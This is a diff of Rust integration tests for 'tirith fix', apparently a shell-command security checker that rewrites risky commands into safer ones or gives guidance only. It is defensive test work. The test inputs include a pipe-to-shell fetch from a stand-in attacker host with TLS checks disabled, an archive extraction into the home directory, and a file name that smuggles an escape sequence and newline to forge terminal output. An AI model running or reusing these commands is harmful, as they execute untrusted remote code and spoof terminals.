@@ -7847,7 +7847,8 @@ fn explain_fix_without_rule_or_finding_is_rejected() {
     assert_ne!(out.status.code(), Some(0));
 }
 
-// tirith fix (M6 ch4). `tirith fix` is a thin presenter over `safe_command::suggest()`.
+// tirith fix (M6 ch4). `tirith fix` is a thin presenter over
+// `safe_command::suggest_verified()`.
 
 #[test]
 fn fix_clean_command_exits_zero_with_no_findings_envelope() {
@@ -7930,6 +7931,175 @@ fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
             "every suggestion must have a non-empty rationale"
         );
     }
+}
+
+#[test]
+fn fix_composes_multi_finding_rewrites_and_only_emits_an_allow_command() {
+    // Regression for repo-0149: dropping only `-k` would leave both the plain-
+    // HTTP sink and pipe-to-shell findings. The executable field must contain a
+    // composed final command, and that exact string must pass the same checker.
+    let out = tirith()
+        .args([
+            "fix",
+            "--json",
+            "--non-interactive",
+            "--",
+            "curl -k http://attacker.invalid/script | bash",
+        ])
+        .output()
+        .expect("failed to run tirith fix");
+    assert_eq!(out.status.code(), Some(2));
+    let suggestions: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("fix output is JSON");
+    let executable: Vec<&str> = suggestions
+        .as_array()
+        .expect("findings-present shape is an array")
+        .iter()
+        .filter_map(|suggestion| suggestion["safe_command"].as_str())
+        .collect();
+    assert_eq!(
+        executable.len(),
+        1,
+        "only the composed, verified command may be executable: {suggestions}"
+    );
+    let command = executable[0];
+    assert!(
+        !command.contains(" -k"),
+        "TLS bypass must be removed: {command}"
+    );
+    assert!(
+        command.contains("https://attacker.invalid/script"),
+        "plain HTTP must be upgraded in the composed command: {command}"
+    );
+    assert!(
+        command.contains("less /tmp/tirith-review.sh"),
+        "pipe-to-shell must become review-before-run: {command}"
+    );
+
+    let checked = tirith()
+        .args([
+            "check",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--no-daemon",
+            "--offline",
+            "--",
+            command,
+        ])
+        .output()
+        .expect("re-analyze emitted command");
+    assert_eq!(
+        checked.status.code(),
+        Some(0),
+        "the exact executable suggestion must re-analyze to Allow; stderr={} stdout={}",
+        String::from_utf8_lossy(&checked.stderr),
+        String::from_utf8_lossy(&checked.stdout)
+    );
+}
+
+#[test]
+fn fix_keeps_archive_preview_then_extract_partial_rewrite_out_of_json() {
+    // The historical transform appended the original sensitive extraction
+    // after a truncated listing. Re-analysis still sees ArchiveExtract
+    // (Medium), so no executable field may be serialized.
+    let out = tirith()
+        .args([
+            "fix",
+            "--json",
+            "--non-interactive",
+            "--",
+            "tar -xzf payload.tar.gz -C ~/",
+        ])
+        .output()
+        .expect("failed to run tirith fix");
+    assert_eq!(out.status.code(), Some(1));
+    let suggestions: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("fix output is JSON");
+    let archive = suggestions
+        .as_array()
+        .expect("findings-present shape is an array")
+        .iter()
+        .find(|suggestion| suggestion["rule_id"] == "archive_extract")
+        .expect("archive guidance is present");
+    assert!(
+        archive.get("safe_command").is_none() || archive["safe_command"].is_null(),
+        "a still-Medium archive extraction must be guidance-only: {archive}"
+    );
+    assert!(
+        archive["rationale"]
+            .as_str()
+            .is_some_and(|value| value.contains("guidance-only")),
+        "partial status must be explicit: {archive}"
+    );
+}
+
+#[test]
+fn fix_reanalysis_preserves_custom_policy_and_cwd_context() {
+    // The raw TLS rewrite is clean under built-in rules, but this repo policy
+    // forbids the target host at Medium severity. Losing cwd/policy during
+    // re-analysis would incorrectly expose it as executable.
+    let policy = r#"custom_rules:
+  - id: forbid-example-fetch
+    when:
+      url.host: example.com
+    severity: medium
+    title: "Example fetches are forbidden here"
+    context: [exec]
+"#;
+    let (_tmp, project) = rule_project(policy);
+    let out = tirith_in_proj(&project)
+        .args([
+            "fix",
+            "--json",
+            "--non-interactive",
+            "--",
+            "curl -k https://example.com/file",
+        ])
+        .output()
+        .expect("failed to run tirith fix under custom policy");
+    assert_eq!(out.status.code(), Some(1));
+    let suggestions: serde_json::Value =
+        serde_json::from_slice(&out.stdout).expect("fix output is JSON");
+    assert!(
+        suggestions
+            .as_array()
+            .expect("findings-present shape is an array")
+            .iter()
+            .all(|suggestion| suggestion.get("safe_command").is_none()
+                || suggestion["safe_command"].is_null()),
+        "custom-policy Medium finding must keep every candidate out of the executable field: {suggestions}"
+    );
+}
+
+#[test]
+fn fix_partial_rewrite_human_guidance_is_terminal_safe() {
+    // Non-TTY human mode takes the guidance-only renderer once verification
+    // removes the archive candidate. Hostile command bytes must not repaint the
+    // terminal or forge a guidance line.
+    let out = tirith()
+        .args([
+            "fix",
+            "--",
+            "tar -xzf 'payload\x1b[2J\nFORGED.tar.gz' -C ~/",
+        ])
+        .output()
+        .expect("failed to run tirith fix");
+    assert_eq!(out.status.code(), Some(1));
+    assert!(out.stdout.is_empty(), "guidance must not reach eval/stdout");
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        !stderr.contains('\x1b'),
+        "ESC must not reach guidance: {stderr:?}"
+    );
+    assert!(
+        !stderr.contains("\nFORGED"),
+        "hostile input must not forge a guidance line: {stderr:?}"
+    );
+    assert!(
+        stderr.contains("no mechanical rewrite available"),
+        "{stderr}"
+    );
 }
 
 #[test]
